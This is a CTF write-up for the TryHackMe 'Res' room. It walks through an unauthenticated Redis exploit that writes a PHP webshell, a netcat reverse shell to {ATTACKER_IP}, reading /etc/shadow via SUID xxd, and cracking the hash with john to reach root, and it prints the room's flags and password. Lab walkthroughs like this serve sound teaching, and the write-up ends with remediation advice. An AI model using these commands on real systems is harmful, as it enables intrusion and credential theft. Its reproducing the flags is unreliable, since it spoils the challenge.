# Res Room (2025) — Write-up

**Author:** Daniel Demian  
**Room:** [Res (TryHackMe)](https://tryhackme.com/room/res)  
**Difficulty:** Easy 🟢  
**Time to complete:** ~30 minutes

---

## Summary
A compact, beginner-friendly box demonstrating a high-yield workflow: service enumeration → Redis RCE (no auth) → user compromise → SUID-based privilege escalation using `xxd` to read `/etc/shadow`, crack the hash, and escalate to root.

---

## TL;DR
- **Initial access:** Redis RCE (write a PHP webshell into `/var/www/html`)  
- **User flag:** `thm{red1s_rce_w1thout_credent1als}`  
- **Escalation:** SUID `xxd` → read `/etc/shadow` → crack hash → `su vianka` → `sudo su -`  
- **Root flag:** `thm{xxd_pr1v_escalat1on}`

---

## Recon & enumeration

**Command used**
```bash
nmap -p- -sC -sV -T4 {TARGET_IP} -oA scans/full_tcp
```

**Representative Nmap output**
```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
6379/tcp open  redis   Redis key-value store 6.0.7
```

**Quick answers**
- Open ports: **2**  
- DBMS: **Redis**  
- Redis port: **6379**  
- Redis version: **6.0.7**

---

## Initial access — Redis RCE (webshell)
Install `redis-tools` on your attacker host and connect:
```bash
redis-cli -h {TARGET_IP}
```

Inside Redis:
```text
flushall
set pwn "<?php system($_REQUEST['cmd']); ?>"
config set dbfilename webshell.php
config set dir /var/www/html
save
```

Trigger the webshell to get a reverse shell:
```bash
# on attacker
nc -nlvp 1234

# in browser
http://{TARGET_IP}/webshell.php?cmd=nc%20{ATTACKER_IP}%201234%20-e%20/bin/bash
```

Upgrade the shell:
```bash
python3 -c 'import pty, os; pty.spawn("/bin/bash")'
# on local: stty raw -echo; fg
export TERM=xterm-256color
reset
```

User flag:
```bash
cat /home/vianka/user.txt
# thm{red1s_rce_w1thout_credent1als}
```

---

## Post-exploitation & local enumeration
Useful commands:
```bash
id; uname -a; cat /etc/os-release
find / -perm -4000 -type f 2>/dev/null
ls -la /home; ls -la /home/vianka
grep -R --line-number -i "password" /home /etc 2>/dev/null
```

Notable finding: `/usr/bin/xxd` had the SUID bit set — unusual for that utility.

---

## Privilege escalation — `xxd` to read `/etc/shadow`
Dump and reconstruct `/etc/shadow`:
```bash
LFILE=/etc/shadow
xxd "$LFILE" | xxd -r > /tmp/shadow
cat /tmp/shadow | sed -n '1,10p'
```

Identify hash type (prefix):  
- `$6$` = sha512crypt
- `$5$` = sha256crypt
- `$1$` = md5crypt
- `$2y$`/`$2a$` = bcrypt

Transfer files to attacker (example):
```bash
cd /tmp
python3 -m http.server 8000
# on attacker:
wget http://{TARGET_IP}:8000/shadow
wget http://{TARGET_IP}:8000/passwd
```

Merge and crack:
```bash
unshadow passwd shadow > hashes
john --wordlist=/usr/share/wordlists/rockyou.txt --rules hashes
# cracked: beautiful1 (vianka)
```

---

## Final escalation & root
```bash
su - vianka
# password: beautiful1
sudo -l
sudo su -
cat /root/root.txt
# thm{xxd_pr1v_escalat1on}
```

---

## Final thoughts & remediation
- **Don’t expose** management services (Redis) to untrusted networks — require authentication and network ACLs.  
- **Audit SUID binaries** and remove SUID from non-essential tools (`chmod u-s /usr/bin/xxd`).  
- **Enforce strong passwords** and MFA; salted hashes with weak passwords are still crackable.  
- **Practice the basics**: fast nmap + service-specific enumeration + GTFOBins + John/hashcat is a very effective workflow for beginner boxes.

---

## All answers (quick list)
- Open ports: **2**  
- DBMS: **Redis**  
- Redis port: **6379**  
- Redis version: **6.0.7**  
- User flag: `thm{red1s_rce_w1thout_credent1als}`  
- Local user password: `beautiful1`  
- Root flag: `thm{xxd_pr1v_escalat1on}`

---
